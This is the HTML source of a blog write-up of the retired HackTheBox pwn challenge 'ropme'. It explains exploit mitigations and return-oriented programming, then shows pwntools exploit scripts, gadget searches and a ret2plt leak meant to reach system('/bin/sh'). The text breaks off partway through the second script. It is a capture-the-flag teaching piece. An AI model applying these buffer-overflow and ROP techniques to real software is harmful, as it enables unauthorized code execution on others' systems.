@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>HackTheBox Pwn: Ropme - memN0ps</title>
+  <meta name="description" content="Bypassing Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR) Buffer Overflow / Memory Corruption A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer.
+A buffer is a sequential section of memory that is allocated to contain anything from strings to integers. Going past the memory area of the allocated block can crash the program, corrupt data and even execute malicious code.">
+  <meta name="author" content="memN0ps"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "memN0ps",
+    
+    "url": "https:\/\/memn0ps.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/memn0ps.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/memn0ps.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/memn0ps.github.io\/HackTheBox-Pwn-Ropme\/",
+          "name": "Hack the box pwn ropme"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "memN0ps"
+  },
+  "headline": "HackTheBox Pwn: Ropme",
+  "description" : "Bypassing Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR) Buffer Overflow \/ Memory Corruption A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer.\nA buffer is a sequential section of memory that is allocated to contain anything from strings to integers. Going past the memory area of the allocated block can crash the program, corrupt data and even execute malicious code.",
+  "inLanguage" : "en",
+  "wordCount":  3532 ,
+  "datePublished" : "2021-12-17T00:00:00",
+  "dateModified" : "2021-12-17T00:00:00",
+  "image" : "https:\/\/memn0ps.github.io\/avatar-icon.jpg",
+  "keywords" : [ "" ],
+  "mainEntityOfPage" : "https:\/\/memn0ps.github.io\/HackTheBox-Pwn-Ropme\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/memn0ps.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/memn0ps.github.io\/avatar-icon.jpg",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="HackTheBox Pwn: Ropme" />
+<meta property="og:description" content="Bypassing Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR) Buffer Overflow / Memory Corruption A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer.
+A buffer is a sequential section of memory that is allocated to contain anything from strings to integers. Going past the memory area of the allocated block can crash the program, corrupt data and even execute malicious code.">
+<meta property="og:image" content="https://memn0ps.github.io/avatar-icon.jpg" />
+<meta property="og:url" content="https://memn0ps.github.io/HackTheBox-Pwn-Ropme/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="memN0ps" />
+
+  <meta name="twitter:title" content="HackTheBox Pwn: Ropme" />
+  <meta name="twitter:description" content="Bypassing Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR) Buffer Overflow / Memory Corruption A buffer overflow is when an application attempts to write more data in a …">
+  <meta name="twitter:image" content="https://memn0ps.github.io/avatar-icon.jpg" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@memN0ps" />
+  <meta name="twitter:creator" content="@memN0ps" />
+  <link href='https://memn0ps.github.io/avatar-icon.jpg' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.93.1" />
+  <link rel="alternate" href="https://memn0ps.github.io/index.xml" type="application/rss+xml" title="memN0ps"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://memn0ps.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://memn0ps.github.io/css/syntax.css" /><link rel="stylesheet" href="https://memn0ps.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://memn0ps.github.io/">memN0ps</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="memN0ps" href="https://memn0ps.github.io/">
+            <img class="avatar-img" src="https://memn0ps.github.io/avatar-icon.jpg" alt="memN0ps" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>HackTheBox Pwn: Ropme</h1>
+              
+              
+              
+              
+                <span class="post-meta">
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Posted on December 17, 2021
+  
+  
+  
+  
+    
+      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;memN0ps
+    
+  
+  
+</span>
+
+
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <h1 id="bypassing-data-execution-prevention-dep-and-address-space-layout-randomization-aslr">Bypassing Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)</h1>
+<h2 id="buffer-overflow--memory-corruption">Buffer Overflow / Memory Corruption</h2>
+<p>A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer.</p>
+<p>A buffer is a sequential section of memory that is allocated to contain anything from strings to integers. Going past the memory area of the allocated block can crash the program, corrupt data and even execute malicious code.</p>
+<h2 id="memory-layout">Memory Layout</h2>
+<p>The following shows the memory layout of a process on x86_64 Linux:</p>
+<p><img src="/HackTheBox-Pwn-Ropme/0.png" alt="1"></p>
+<h2 id="memory-protection-history">Memory Protection History</h2>
+<ul>
+<li>Stack Cookies / Canaries 2000</li>
+<li>Data Execution Prevention (DEP) 2004</li>
+<li>Address Space Layout Randomization (ASLR) 2005</li>
+<li>Position Indepedent Executable (PIE)</li>
+<li>Relocation Read-Only (RELRO)</li>
+</ul>
+<h2 id="what-is-data-execution-preventionno-execute-depnx">What is Data Execution Prevention/No Execute (DEP/NX)</h2>
+<p>Data Execution Prevention (DEP) also known as No execute (NX) is an exploit-mitigation found in most modern software, which is designed to prevent code injection techniques such as shellcoding by making the stack not executable.</p>
+<p>Data Execution Prevention (DEP/NX) was implemented in 2004 on Linux and is known by several different names such as:</p>
+<ul>
+<li><code>N</code>ever e<code>X</code>ecute (NX)</li>
+<li>e<code>X</code>ecute <code>N</code>ever (XN)</li>
+<li>e<code>X</code>ecute <code>D</code>isable (XD)</li>
+<li><code>W</code>rite ^ e<code>X</code>ecute (W^X)</li>
+</ul>
+<h2 id="what-is-address-space-layout-randomization-aslr">What is Address Space Layout Randomization (ASLR)</h2>
+<p>Address Space Layout Randomization (ASLR) is exploit-mitigation found in most modern operating systems, which is designed to randomise the address space of a binary upon execution, such as the stack, heap and shared libraries. Bypassing Address Space Layout Randomization (ASLR) will nearly always require an information leak that lets you calculate the current address-space layout in real-time.</p>
+<p>ASLR was first implemented on Linux in 2005 and it is different to Position Independent Executable (PIE) / Position Independent Code (PIC)</p>
+<h2 id="what-is-position-independent-executable-pie--position-independent-code-pic">What is Position Independent Executable (PIE) / Position Independent Code (PIC)</h2>
+<p>Position Independent Executable (PIE) or Position Independent Code (PIC) is an exploit-mitigation sometimes found in most modern binaries, which is designed to randomise the code and data sections of a binary and is an extension to the concept Address Space Layout Randomization (ASLR). Position Independent Executable (PIE)/Position Independent Code (PIC) is a compile-time option in comparison to Address Space Layout Randomization (ASLR) which is found on most modern operating systems.</p>
+<p>To successfully exploit binaries compiled with PIE via memory corruption will nearly always require an information leak.</p>
+<h2 id="what-is-stack-cookie--stack-canary--stack-protector--stack-guard">What is Stack Cookie / Stack Canary / Stack Protector / Stack Guard</h2>
+<p>Stack cookie/canary/protector/guard is an exploit-mitigation sometimes found in most modern binaries, which is designed to detect stack-based buffer overflows by placing a randomised value on the stack when a function is called, right after the function pro-prologue. This value is then checked right before the function epilogue and if the value is not present then execution is aborted early to prevent successful exploitation of the return address (stack smashing).</p>
+<p>Stack Cookies/Canaries were implemented in the early 2000s as one of the first exploit-mitigations.</p>
+<h2 id="what-is-relocation-read-only-relro">What is Relocation Read-Only (RELRO)</h2>
+<p>Full Relocation Read-Only (RELRO) is an exploit-mitigation that makes the Global Offset Table (GOT) read-only. This is to prevent GOT overwrite attacks, which is where the address of a function is overwritten with the location of another function that the attacker might want to run.</p>
+<p>Partial Relocation Read-Only (RELRO) is a default setting in GCC that forces the GOT to come before the BSS segment in memory which minimises the risk of global variable overwriting the GOT entries.</p>
+<h2 id="relocations">Relocations</h2>
+<p>The Global Offset Table (GOT) is a section inside a binary (ELF), which resolves functions located in shared libraries that are dynamically linked.</p>
+<p>The Procedure Linkage Table (PLT) uses the dynamic linker to resolve the addresses of external functions (procedures) in the <code>.got.plt</code>, if they are not known at run time.</p>
+<h2 id="what-is-return-oriented-programming-rop">What is Return Oriented Programming (ROP)</h2>
+<p>Return Oriented Programming (ROP) is the technique for re-using existing snippets of code (ROP gadgets) in creative ways, to bypass Data Execution Prevention (DEP), rather than injecting shellcode.</p>
+<h2 id="what-are-rop-gadgets">What are ROP Gadgets?</h2>
+<p>ROP gadgets are existing snippets of code in the program itself, typically any piece of instruction that ends with the <code>ret</code> instruction.</p>
+<p>For example: <code>pop rdi; ret</code></p>
+<h2 id="what-is-a-rop-chain">What is a ROP chain?</h2>
+<p>A ROP chain is chaining together multiple ROP gadgets, to form a ROP chain.</p>
+<p>For example:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">pop</span> <span class="no">rdi</span> <span class="c">; ret
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">pop</span> <span class="no">rsi</span> <span class="c">; ret
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">pop</span> <span class="no">rdx</span> <span class="c">; ret
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">pop</span> <span class="no">rax</span> <span class="c">; ret
+</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="no">syscall</span> <span class="c">; ret
+</span></span></span></code></pre></div><h2 id="what-is-the-c-standard-library-libc">What is the C Standard Library (LIBC)</h2>
+<p>The C Standard Library (LIBC) is a library of standard functions that is used by all C programs in Linux.</p>
+<h2 id="the-stack">The Stack</h2>
+<p>A lot of people can get confused about the way the stack is laid out. Intel&rsquo;s x86 architecture places its stack &ldquo;head down&rdquo;. So the &ldquo;top of the stack&rdquo; on x86, actually mean the lowest address in the memory area is at the bottom of the stack.</p>
+<p>However, this is very unnatural and most people prefer stack &ldquo;head up&rdquo; and debuggers will show the stack &ldquo;head up&rdquo;. So the &ldquo;top of the stack&rdquo; on x86 will mean that the highest address in the memory area is at the top of the stack.</p>
+<p>To avoid getting confused picturing the following ASCII diagram might help.</p>
+<pre tabindex="0"><code>            +-------- 0x7fffffffxxxx (RSP) ---------+ /|\ 
+            +--------unallocated stack space--------|  |
+            +---------------------------------------+  |
+            | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |  |
+            +---------------------------------------+  |            
+            | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |  |
+            +---------------------------------------+  |
+            | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |  |
+            +---------------------------------------+  |
+            | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |  |
+            +---------------------------------------+  |
+            | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |  | Stack grows upwards
+            +---------------------------------------+  |
+            | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |  |
+            +---------------------------------------+  |
+            | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |  |
+stack       +---------------------------------------+  |
+cookie -&gt;   | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |  |
+            +-------- 0x7fffffffxxxx (RBP) ---------+  |
+old RBP -&gt;  | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |  |
+            +---------------------------------------+  |
+return -&gt;   | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |  |
+address     +---------------------------------------+  |
+            +--------previous stack frame-----------|  |
+            +---------------------------------------+  |
+</code></pre><h2 id="stack-frame">Stack Frame</h2>
+<p>A stack frame is a linear sequence of memory allocations known as stack frames and each time a function is called, the stack will automatically allocate a new stack frame.</p>
+<p>When functions execute, it will use the given stack frame to store and operate upon its local variables.</p>
+<p>Once the function returns, this memory will automatically get released back to the stack.</p>
+<h3 id="function-prologue">Function Prologue</h3>
+<p>The first <code>push rbp</code> instruction saves the base pointer on top of the stack. This is also known as <code>old RBP</code>  inside a function prologue.</p>
+<p>The second instruction saves the stack pointer (<code>RSP</code>) inside the base pointer (<code>RBP</code>).</p>
+<p>The third instruction is known as allocation a stack frame. The third instruction subtracts a value from the stack pointer, the value varies from program to program but in this case, it is <code>0x100</code> which is <code>256</code> bytes.</p>
+<pre tabindex="0"><code>push rbp				  ; save old base pointer
+mov rbp, rsp			; set a new base pointer
+sub rsp, 0x100		; allocate 0x100 bytes on the stack 
+</code></pre><p><code>RBP</code> is like a bookend used in assembly to tell us where we are in the current stack frame.</p>
+<h3 id="function-epilogue">Function Epilogue</h3>
+<p>At the end of every function, the compiler will insert a few instructions which make up the <code>function epilogue</code>.</p>
+<pre tabindex="0"><code>leave
+retn
+</code></pre><p>The <code>leave</code> instruction does the opposite to the function prologue, the role of the epilogue is to release the current stack frame and return execution to the caller, think of this like memory is being deallocated.</p>
+<p>The leave instruction is short for the following:</p>
+<pre tabindex="0"><code>mov rsp, rbp 		; release the current stack frame
+pop rbp 			  ; restore old base pointer
+</code></pre><p>The <code>retn</code> instruction will POP the return address from the stack back into RIP to resume execution flow.</p>
+<pre tabindex="0"><code>pop rip
+</code></pre><p>So this means that if we overwrite RSP just before <code>retn</code> is called we can hijack the execution flow of the program.</p>
+<h2 id="calling-conventions-for-x86-64-linux">Calling Conventions for x86-64 Linux</h2>
+<p>The procedure to pass arguments to, and receive results from functions is called <code>calling convention</code>. This will vary across operating systems and architectures.</p>
+<p>In x86-64 Linux before a function is called arguments are placed in registers in the following order:</p>
+<pre tabindex="0"><code>1st arg: RDI
+2nd arg: RSI
+3rd arg: RDX
+4th arg: RCX
+5th arg: R8
+6th arg: R9
+
+Result: rax
+</code></pre><p>Any additional arguments are placed on the stack.</p>
+<h2 id="pwnage">Pwnage</h2>
+<p>I&rsquo;ll be using a binary from <a href="https://www.hackthebox.com/home/challenges/Pwn">HackTheBox</a> called <code>ropme</code>. This challenge is retired and writeups are permitted.</p>
+<p>After unzipping the file we can see that the binary is an ELF 64-bit file that is not stripped of symbols. Symbols are used for translating function or variable names into an address which is useful for debugging.</p>
+<pre tabindex="0"><code>file ropme 
+ropme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e30ea7fd405c5104fd0d97dc464c513b05005fdb, not stripped
+</code></pre><p>We can run the program with GDB and use checksec to see what memory protections it has.</p>
+<p>Here we can see that only NX (DEP) is enabled.</p>
+<pre tabindex="0"><code>gdb -q ropme
+GEF for linux ready, type `gef&#39; to start, `gef config&#39; to configure
+92 commands loaded for GDB 10.1.90.20210103-git using Python engine 3.9
+Reading symbols from ropme...
+(No debugging symbols found in ropme)
+gef➤  checksec
+[+] checksec for &#39;/root/Ropme/ropme&#39;
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : Partial
+gef➤  
+</code></pre><h2 id="reverse-engineering">Reverse Engineering</h2>
+<p>I personally like to use radare2-cutter has it is open-source, comes with Ghidra&rsquo;s decompiler and a sexy graph view. Not to mention it has dark mode.</p>
+<p>radare2-cutter shows the entry point of the binary, the language it is made in and the CPU architecture.</p>
+<p><img src="/HackTheBox-Pwn-Ropme/1.png" alt="1"></p>
+<p>The graph view shows that the <code>0x50 (80) bytes</code> are allocated on the stack by subtracting it from <code>RSP</code>.</p>
+<p>We can see that the string <code>ROP me outside, how 'about dah?</code> is moved into <code>EDI</code> and then <code>puts()</code> is called. <code>EDI</code> being the first argument of <code>puts()</code></p>
+<p><img src="/HackTheBox-Pwn-Ropme/2.png" alt="2"></p>
+<p>We can also use GDB to do this by disassembling the main function. However, graph view may provide more insight for larger programs.</p>
+<p><img src="/HackTheBox-Pwn-Ropme/3.png" alt="3"></p>
+<p>Moving down further we can see that <code>fgets()</code> is being called.</p>
+<p>The first argument is a pointer to a character (<code>char *s</code>), which is moved from <code>RAX</code> to <code>RDI</code>, RDI being the first argument of <code>fgets()</code>.</p>
+<p>The second argument is the size of the buffer (<code>int size</code>), <code>500 bytes (0x1f4)</code> are moved into <code>ESI</code>.</p>
+<p>The third argument is a pointer to a file stream (<code>FILE *stream</code>) that reads characters from the stream and stores them into the buffer pointed to by <code>s</code>.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>The problem here occurs when 80 bytes (0x50) are allocated on the stack by subtracting it from RSP and fgets() allows a user to input 500 bytes. This makes it clear that if we input 72 bytes, anything after that would overwrite the return address on the stack and when <code>ret</code> is called we gain control of the execution flow.</p>
+<p>Another way to locate this vulnerability is by fuzzing or sending a large buffer until you get a segmentation fault. However, this won&rsquo;t always work, especially for large programs.</p>
+<p>Here we create a unique pattern of 100 bytes and run the program.</p>
+<pre tabindex="0"><code>gef➤  pattern create 100
+[+] Generating a pattern of 100 bytes
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+[+] Saved as &#39;$_gef0&#39; 
+gef➤  r
+Starting program: /root/Ropme/ropme 
+ROP me outside, how &#39;about dah?
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+</code></pre><p>After creating a pattern of 100 bytes and sending the pattern we get a segmentation fault, we can locate the offset of RSP. The offset was 72 as we saw earlier from reversing the program. This means that after 72 bytes we will start overwriting the return address.</p>
+<p><img src="/HackTheBox-Pwn-Ropme/4.png" alt="4"></p>
+<p>The reason the program crashed is that it tries to execute invalid instructions, when the function tries to return to the caller it will <code>POP RSP</code> into <code>RIP</code> attempt to execute. In this case, the main function is trying to return to the caller, but if the vulnerability was in another function such as <code>example()</code> then when <code>example()</code> tries to return to the caller the program will crash.</p>
+<h2 id="pwntools">Pwntools</h2>
+<p>Pwntools is a CTF framework and exploits the development library that is written in Python. This framework makes exploiting programs easy as pie.</p>
+<h3 id="exploit-1">Exploit 1</h3>
+<p>Here we will attach GDB to the process and send 72 A&rsquo;s and 8 B&rsquo;s</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Pwnage by memN0ps!!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;DEBUG&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#context(terminal=[&#39;tmux&#39;, &#39;new-window&#39;])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./ropme&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;./ropme&#34;</span><span class="p">,</span> <span class="s2">&#34;b main&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;B&#34;</span> <span class="o">*</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ROP me outside, how &#39;about dah?&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p><img src="/HackTheBox-Pwn-Ropme/5.png" alt="5"></p>
+<h2 id="ret2plt-to-ret2system-or-ret2libc">Ret2plt to Ret2system or Ret2libc</h2>
+<p>A ret2plt or ret2puts is an exploitation technique that calls <code>puts@plt</code> function and passes the Global Offset Table (GOT) entry of <code>puts()</code> function as a parameter, which causes <code>puts</code> to print its own address in C Standard Library (LIBC).</p>
+<p>After that we call the main function and overwrite the return address with a gadget that will pop the value of <code>/bin/sh</code> into the <code>RDI</code> register and call return straight away using <code>pop rdi; ret</code>. But we will have to ensure that the string <code>/bin/sh</code> is on the stack at the time of calling <code>pop rdi; ret</code>. We then call the system function right after that.</p>
+<p>To bypass DEP we need to use Return Oriented Programming (ROP) and if we want a shell we need to call <code>system(&quot;/bin/sh&quot;)</code>. The first argument in x86_64 Linux is <code>RDI</code> as explained before.</p>
+<p>We perform <code>ret2plt</code> to leak the address of <code>puts</code> and calculate the address of <code>libc</code> using the leaked address and then ret2system by calculating the address of <code>system</code> from the CORRECT version of <code>libc</code>.</p>
+<p>To manually find the <code>pop rdi; ret</code> gadget we can use <code>ropper</code> to search inside the binary.</p>
+<pre tabindex="0"><code>$ ropper --file ropme --search &#34;pop rdi&#34;                                                                                                                         130 ⨯
+[INFO] Load gadgets for section: PHDR
+[LOAD] loading... 100%
+[INFO] Load gadgets for section: LOAD
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop rdi
+
+[INFO] File: ropme
+0x00000000004006d3: pop rdi; ret; 
+</code></pre><p>To search for <code>puts@plt</code> and the <code>main@plt</code> offsets we can use <code>objdump</code> inside the binary.</p>
+<pre tabindex="0"><code>$ objdump -D ropme |grep puts
+00000000004004e0 &lt;puts@plt&gt;:
+  4004e0:       ff 25 32 0b 20 00       jmpq   *0x200b32(%rip)         601018 &lt;puts@GLIBC_2.2.5&gt;
+  40063a:       e8 a1 fe ff ff          callq  4004e0 &lt;puts@plt&gt;
+</code></pre><pre tabindex="0"><code>$ objdump -D ropme | grep main
+00000000004004f0 &lt;__libc_start_main@plt&gt;:
+  4004f0:       ff 25 2a 0b 20 00       jmpq   *0x200b2a(%rip)        # 601020 &lt;__libc_start_main@GLIBC_2.2.5&gt;
+  400554:       e8 97 ff ff ff          callq  4004f0 &lt;__libc_start_main@plt&gt;
+0000000000400626 &lt;main&gt;:
+</code></pre><p>We grap the libc puts offset so we can calculate it at run time.</p>
+<pre tabindex="0"><code>$ readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep puts
+   195: 00000000000765f0   472 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
+   430: 00000000000765f0   472 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
+   505: 0000000000102a10  1268 FUNC    GLOBAL DEFAULT   14 putspent@@GLIBC_2.2.5
+   692: 0000000000104690   696 FUNC    GLOBAL DEFAULT   14 putsgent@@GLIBC_2.10
+  1160: 0000000000074f20   380 FUNC    WEAK   DEFAULT   14 fputs@@GLIBC_2.2.5
+</code></pre><h3 id="exploit-2">Exploit 2</h3>
+<p>We should see the address of puts being leaked</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Pwnage by memN0ps!!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;DEBUG&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#context(terminal=[&#39;tmux&#39;, &#39;new-window&#39;])</span>
+</span></span><span class="line"><span class="cl">
